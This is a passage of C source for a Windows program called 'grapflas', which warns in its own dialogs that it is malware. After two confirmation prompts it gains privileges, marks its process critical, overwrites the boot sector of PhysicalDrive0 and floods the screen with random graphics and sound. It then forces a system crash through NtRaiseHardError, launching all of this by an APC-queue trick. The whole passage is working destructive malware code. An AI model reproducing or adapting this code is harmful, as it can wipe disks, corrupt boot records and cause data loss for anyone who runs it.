		else Rectangle(wi.hdc, (wi.rekt).left, y - 1, (wi.rekt).right, y + high);
		DeleteObject(hBrush);
		y += high;
		Sleep(100);
	}
	Sleep(300);
	ReleaseDC(wi.hwnd, wi.hdc);
}
void PayloadRectangularStack()
{
	int x, y;
	winfo w;
	HPEN hPen;
	HBRUSH hBrush;
	w = GetDesktopWinfo();
	hPen = CreatePen(PS_NULL, NULL, NULL);
	SelectObject(w.hdc, hPen);
	x = (w.rekt).left;
	y = (w.rekt).top;
	while (x < (w.rekt).right && y < (w.rekt).bottom)
	{
		hBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
		SelectObject(w.hdc, hBrush);
		Rectangle(w.hdc, x++, y++, (w.rekt).right, (w.rekt).bottom);
		DeleteObject(hBrush);
		Sleep(10);
	}
	ReleaseDC(w.hwnd, w.hdc);
}
void PayloadPixelThread()
{
	winfo w = GetDesktopWinfo();
	for (;;)SetPixel(w.hdc, rand() % (w.rekt).right + (w.rekt).left, rand() % (w.rekt).bottom + (w.rekt).top, RGB(rand() % 256, rand() % 256, rand() % 256));
}
void grapflas()
{
    if (RtlAdjustPrivilege != NULL && NtSetInformationProcess != NULL)
    {
        BOOLEAN tmp1;
        ULONG tmp2 = TRUE;
        ((void(*)(DWORD, BOOLEAN, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(20, TRUE, FALSE, &tmp1);
        ((void(*)(HANDLE, PROCESS_INFORMATION_CLASS, PVOID, ULONG))NtSetInformationProcess)(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)29, &tmp2, sizeof(tmp2));
    }
    else exit(NULL);
	FILE* drive;
	drive = fopen("\\\\.\\PhysicalDrive0", "rb+");
	if (drive == NULL)exit(1);
	if (!fwrite(data, sizeof(data), 1, drive))exit(2);
	fclose(drive);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)notemsg, NULL, NULL, NULL);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)AudioNoteThread, NULL, NULL, NULL);
	Sleep(rand()%20000+1);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)AudioPayload1Thread, NULL, NULL, NULL);
	Sleep(rand() % 3000 + 1);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DrawCursorIcos, NULL, NULL, NULL);
	Sleep(10000);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadIcoGraphics, NULL, NULL, NULL);
	Sleep(10000);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadBuzz, NULL, NULL, NULL);
	Sleep(30000);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)AudioPayload2Thread, NULL, NULL, NULL);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DrawRandomShapeThread, NULL, NULL, NULL);
	Sleep(1000*50);
	sW = FALSE;
	for (int i = 1; i <= 20; i++)PayloadStripe();
	for (int j = 1; j <= 3; j++)PayloadRectangularStack();
	Sleep(1000*10);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)AudioPayload3Thread, NULL, NULL, NULL);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadPixelThread, NULL, NULL, NULL);
	Sleep(1000 * 5);
	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL)
	{
		BOOLEAN tmp1;
		DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000314, 0, 0, 0, 6, &tmp2);
	}
	ExitThread(NULL);
}
void PuppetThread()
{
	for (;;);
}
void ApcCallFun(LPVOID fun)
{
	HANDLE pt = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PuppetThread, NULL, NULL, NULL);
	FARPROC NtTestAlert = GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert");
	QueueUserAPC((PAPCFUNC)(PTHREAD_START_ROUTINE)fun, pt, NULL);
	((void(*)(void))NtTestAlert)();
	WaitForSingleObject(pt, INFINITE);
	CloseHandle(pt);
}
void main()
{
    if (MessageBox(NULL, L"你刚刚运行的程序被认为是一个恶意软件，可能导致系统受损和数据丢失。点击否不运行，仍要运行点击是。\r\nThe program you just ran is considered a piece of malware and may cause system damage and data loss. Click No to not run, click Yes to run anyway.", L"grapflas", MB_ICONWARNING | MB_YESNO | MB_SYSTEMMODAL) == IDYES)
    {
        if (MessageBox(NULL, L"这是最后一次提示，仍要运行被认为是有害的程序吗？\r\nThis is the last reminder,still want to run a program considered unwanted?", L"grapflas", MB_ICONQUESTION | MB_YESNO) == IDYES)
        {
			srand((unsigned)time(NULL));
			ApcCallFun(grapflas);
        }
    }
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
